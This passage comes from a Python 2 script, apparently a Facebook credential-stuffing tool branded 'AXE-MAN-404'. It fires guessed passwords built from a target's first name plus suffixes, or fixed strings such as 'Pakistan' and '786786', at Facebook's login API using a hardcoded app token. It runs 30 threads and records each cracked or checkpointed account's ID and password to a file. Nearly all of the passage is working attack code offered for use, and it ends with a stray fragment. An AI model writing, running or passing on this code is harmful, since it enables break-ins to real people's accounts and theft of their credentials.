				                           print '\x1b[1;94m[👻] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + '1122'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;94m[👽] \x1b[1;92m[OK]'											
				                                   print '\x1b[1;93m[👽] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				                                   print '\x1b[1;92m[👽] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user											
				                                   print '\x1b[1;91m[👽] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;94m[👽] \x1b[1;96m[Checkpoint]'
				                                       print '\x1b[1;93m[👽] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                       print '\x1b[1;92m[👽] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                       print '\x1b[1;91m[👽] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '786786'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;97m[👻] \x1b[1;92m[OK]'						
						                               print '\x1b[1;97m[👻] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']							
						                               print '\x1b[1;97m[👻] \x1b[1;97mID \x1b[1;97m      : \x1b[1;95m' + user					
						                               print '\x1b[1;97m[👻] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;97m[👻] \x1b[1;96m[Checkpoint]'
				                                                   print '\x1b[1;97m[👻] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                   print '\x1b[1;97m[👻] \x1b[1;97mID \x1b[1;97m      : \x1b[1;95m' + user
				                                                   print '\x1b[1;97m[👻] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = 'Pakistan'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;97m[👽] \x1b[1;92m[OK]'											
				                                                           print '\x1b[1;97m[👽] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				                                                           print '\x1b[1;97m[👽] \x1b[1;97mID \x1b[1;97m      : \x1b[1;96m' + user									
				                                                           print '\x1b[1;97m[👽] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;97m[👽] \x1b[1;96m[Checkpoint]'
				                                                               print '\x1b[1;97m[👽] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                               print '\x1b[1;97m[👽] \x1b[1;97mID \x1b[1;97m      : \x1b[1;96m' + user
				                                                               print '\x1b[1;97m[👽] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[👻] \x1b[1;92m[OK]'					
									                               print '\x1b[1;92m[👻] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']					
									                               print '\x1b[1;93m[👻] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user				
									                               print '\x1b[1;94m[👻] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;91m[👻] \x1b[1;96m[Checkpoint]'
				                                                                           print '\x1b[1;92m[👻] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                                           print '\x1b[1;93m[👻] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                                           print '\x1b[1;94m[👻] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = '000786'									
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;97m[👽] \x1b[1;92m[OK]'											
				                                                                                   print '\x1b[1;97m[👽] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				                                                                                   print '\x1b[1;97m[👽] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user										
				                                                                                   print '\x1b[1;97m[👽] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;97m[👽] \x1b[1;96m[Checkpoint]'
				                                                                                       print '\x1b[1;97m[👽] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                                                       print '\x1b[1;97m[👽] \x1b[1;97mID \x1b[1;98m      : \x1b[1;97m' + user
				                                                                                       print '\x1b[1;97m[👽] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '786'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[👻] \x1b[1;92m[OK]'			
											                                       print '\x1b[1;92m[👻] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']			
											                                       print '\x1b[1;93m[👻] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user	
											                                       print '\x1b[1;94m[👻] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;91m[👻] \x1b[1;96m[Checkpoint]'
				                                                                                                   print '\x1b[1;92m[👻] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                                                                   print '\x1b[1;94m[👻] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                                                                   print '\x1b[1;94m[👻] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
        print "\033[1;97m•-----------------\033[1;37m🗡🔥AXE-MAN-404🔥🗡\033[1;97m-----------------•"
	print '\033[1;97m[+]\033[1;47m \033[1;31mProcess Has Been Completed\033[1;0m'
	print"\033[1;97m[+]\033[1;97mTotal \033[1;97mOK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
	print "\033[1;97m«-----------------\033[1;37m🗡🔥AXE-MAN-404🔥🗡\033[1;97m-----------------»"
	print """
 \033[1;97m

 
\033[1;96m  █████╗ ██╗  ██╗███████╗    ███╗   ███╗ █████╗ ███╗   ██╗
\033[1;91m ██╔══██╗╚██╗██╔╝██╔════╝    ████╗ ████║██╔══██╗████╗  ██║
\033[1;93m ███████║ ╚███╔╝ █████╗█████╗██╔████╔██║███████║██╔██╗ ██║
\033[1;92m ██╔══██║ ██╔██╗ ██╔══╝╚════╝██║╚██╔╝██║██╔══██║██║╚██╗██║
\033[1;95m ██║  ██║██╔╝ ██╗███████╗    ██║ ╚═╝ ██║██║  ██║██║ ╚████║
\033[1;97m ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
                                                         

                                           
                                            
\033[1;96m ██████╗  ██████╗  ██████╗ ██████╗     ██╗     ██╗   ██╗ ██████╗██╗  ██╗
\033[1;95m██╔════╝ ██╔═══██╗██╔═══██╗██╔══██╗    ██║     ██║   ██║██╔════╝██║ ██╔╝
\033[1;94m██║  ███╗██║   ██║██║   ██║██║  ██║    ██║     ██║   ██║██║     █████╔╝ 
\033[1;93m██║   ██║██║   ██║██║   ██║██║  ██║    ██║     ██║   ██║██║     ██╔═██╗ 
\033[1;92m╚██████╔╝╚██████╔╝╚██████╔╝██████╔╝    ███████╗╚██████╔╝╚██████╗██║  ██╗
\033[1;91m╚═════╝  ╚═════╝  ╚═════╝ ╚═════╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝
                                                                        
      
"""
	print "\033[1;97m«-----------------\033[1;37mAXE-MAN-404\033[1;97m-----------------»"
	raw_input("\n\033[1;97m[+]\033[1;97mBack")
	menu()

if __name__ == '__main__':
	login()
gin()
